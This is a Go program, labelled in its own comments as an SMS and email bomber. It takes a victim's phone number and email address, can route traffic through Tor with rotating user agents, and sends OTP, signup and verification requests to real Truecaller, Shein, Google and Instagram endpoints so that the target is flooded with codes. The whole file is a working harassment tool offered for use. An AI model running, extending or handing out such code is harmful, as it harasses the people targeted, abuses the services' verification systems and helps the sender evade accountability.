// is code testing...
package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"
	"golang.org/x/net/proxy"
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
}

// countryCodes maps country phone prefixes to country codes
var countryCodes = map[string]string{
	"1":  "us",    // USA, Canada, etc.
	"44": "gb",    // United Kingdom
	"49": "de",    // Germany
	"32": "be",    // Belgium
	"98": "ir",    // Iran
	"33": "fr",    // France
	"34": "es",    // Spain
	"39": "it",    // Italy
	"7":  "ru",    // Russia
	"90": "tr",    // Turkey
	// ... add more if needed
}

// detectCountryCode tries to detect the country code from the phone number (with or without +)
func detectCountryCode(phone string) (prefix, cc, local string) {
	phone = strings.TrimSpace(phone)
	phone = strings.TrimPrefix(phone, "+")
	for plen := 3; plen >= 1; plen-- {
		if len(phone) >= plen {
			prefixTry := phone[:plen]
			if cc, ok := countryCodes[prefixTry]; ok {
				return prefixTry, cc, phone[plen:]
			}
		}
	}
	// fallback: return full, empty, full
	return "", "", phone
}

// randomUserAgent returns a random user-agent string
func randomUserAgent() string {
	rand.Seed(time.Now().UnixNano())
	return userAgents[rand.Intn(len(userAgents))]
}

func getTorClient() *http.Client {
	socksProxy := "127.0.0.1:9050"
	dialer, err := proxy.SOCKS5("tcp", socksProxy, nil, proxy.Direct)
	if err != nil {
		fmt.Println("TOR not available, using direct connection")
		return &http.Client{Timeout: 12 * time.Second}
	}
	transport := &http.Transport{Dial: dialer.Dial}
	return &http.Client{Transport: transport, Timeout: 12 * time.Second}
}

func getDirectClient() *http.Client {
	return &http.Client{Timeout: 12 * time.Second}
}

func sendJSON(client *http.Client, url string, payload map[string]interface{}) {
	jsonData, _ := json.Marshal(payload)
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("Request error:", err)
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", randomUserAgent())
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Send error:", err)
		return
	}
	defer resp.Body.Close()
	fmt.Printf("Sent JSON to %s : %v\n", url, resp.Status)
}

func sendForm(client *http.Client, url string, form url.Values) {
	req, err := http.NewRequest("POST", url, strings.NewReader(form.Encode()))
	if err != nil {
		fmt.Println("Request error:", err)
		return
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", randomUserAgent())
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Send error:", err)
		return
	}
	defer resp.Body.Close()
	fmt.Printf("Sent Form to %s : %v\n", url, resp.Status)
}

func sendGET(client *http.Client, url string) {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println("Request error:", err)
		return
	}
	req.Header.Set("User-Agent", randomUserAgent())
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Send error:", err)
		return
	}
	defer resp.Body.Close()
	fmt.Printf("Sent GET to %s : %v\n", url, resp.Status)
}

func checkTorIP(client *http.Client) string {
	resp, err := client.Get("https://api.ipify.org")
	if err != nil {
		return "Error"
	}
	defer resp.Body.Close()
	buf := new(bytes.Buffer)
	buf.ReadFrom(resp.Body)
	return buf.String()
}

// sanitizePhone returns only digits from input
func sanitizePhone(phone string) string {
	re := regexp.MustCompile(`\D`)
	return re.ReplaceAllString(phone, "")
}

func main() {
	var phoneInput, email string

	fmt.Print("Use TOR? (y/n): ")
	var useTor string
	fmt.Scanln(&useTor)

	var client *http.Client
	if strings.ToLower(useTor) == "y" {
		client = getTorClient()
		fmt.Println("Your TOR IP is:", checkTorIP(client))
	} else {
		client = getDirectClient()
		fmt.Println("Your direct IP is:", checkTorIP(client))
	}

	fmt.Print("Enter phone number with country code (e.g., +32484155542 or 989123456789): ")
	fmt.Scanln(&phoneInput)
	phone := sanitizePhone(phoneInput)
	_, cc, local := detectCountryCode(phone)
	if cc == "" {
		// fallback ask user
		fmt.Print("Could not detect country code. Please enter 2-letter country code (e.g., be): ")
		fmt.Scanln(&cc)
	}

	// اگر local خالی بود یعنی شماره کامل بود
	if local == "" {
		local = phone
	}

	// SMS Bombers
	sendJSON(client, "https://europe-west1-truecaller-web.cloudfunctions.net/webapi/eu/auth/truecaller/v1/send-otp",
		map[string]interface{}{
			"phone":       local,
			"countryCode": cc,
		})

	sendGET(client, "https://www.truecaller.com/cms/z1m1hpbqstj98vij_phone-number-verification-login.json")

	sendForm(client, "https://euqs.shein.com/bff-api/user/geetest/v2/reset.php",
		url.Values{
			"pt": {"110"},
			"w":  {"dummyWValue"},
		})

	sendForm(client, "https://euqs.shein.com/bff-api/user/geetest/v2/ajax.php",
		url.Values{
			"pt": {"110"},
			"w":  {"dummyWValue"},
		})

	sendForm(client, "https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute",
		url.Values{
			"rpcids":      {"rxubAb"},
			"source-path": {"/lifecycle/steps/signup/startmtsmsidv"},
			"hl":          {"en-US"},
			"f.req":       {`[[["rxubAb","[[[\"` + local + `\",\"` + cc + `\"],null,145,\"https://mail.google.com/mail/\",[\"https://mail.google.com/mail/\",\"mail\"]]]",null,"generic"]]]`},
		})

	sendForm(client, "https://www.instagram.com/api/v1/web/accounts/check_phone_number/",
		url.Values{
			"phone_number": {"+" + phone},
			"jazoest":      {"21771"},
		})
	sendForm(client, "https://www.instagram.com/api/v1/web/accounts/send_signup_sms_code_ajax/",
		url.Values{
			"client_id":    {"xjrc26cvhsnepac5li1e39qls1efo4di73f8mitx8asy19mh1ws"},
			"phone_number": {"+" + phone},
			"jazoest":      {"21771"},
		})

	// Email Bombers
	fmt.Print("Enter email address: ")
	fmt.Scanln(&email)

	sendForm(client, "https://euqs.shein.com/bff-api/user/email_register?_ver=1.1.8&_lang=en",
		url.Values{
			"_ver":               {"1.1.8"},
			"_lang":              {"en"},
			"email":              {email},
			"registerFrom":       {"login"},
			"password":           {"setertr1"},
			"prefer":             {"106"},
			"biz_uuid":           {"E2887406804985790464"},
			"clause_country_id":  {"21"},
			"daId":               {"2-7-107"},
			"validate":           {"1"},
			"clause_agree":       {"1"},
			"challenge":          {"934aae3fd526ed617d7336e81cc3dd3e"},
			"gtRisk":             {"true"},
			"blackbox":           {"qWPE517499108369DyVYVRTEl9"},
		})

	sendForm(client, "https://www.instagram.com/api/v1/web/accounts/check_email/",
		url.Values{
			"email":   {email},
			"jazoest": {"21771"},
		})

	sendForm(client, "https://www.instagram.com/api/v1/accounts/send_verify_email/",
		url.Values{
			"device_id": {"xjrc26cvhsnepac5li1e39qls1efo4di73f8mitx8asy19mh1ws"},
			"email":     {email},
			"jazoest":   {"21771"},
		})

	fmt.Println("Done. Check the above responses.")
}
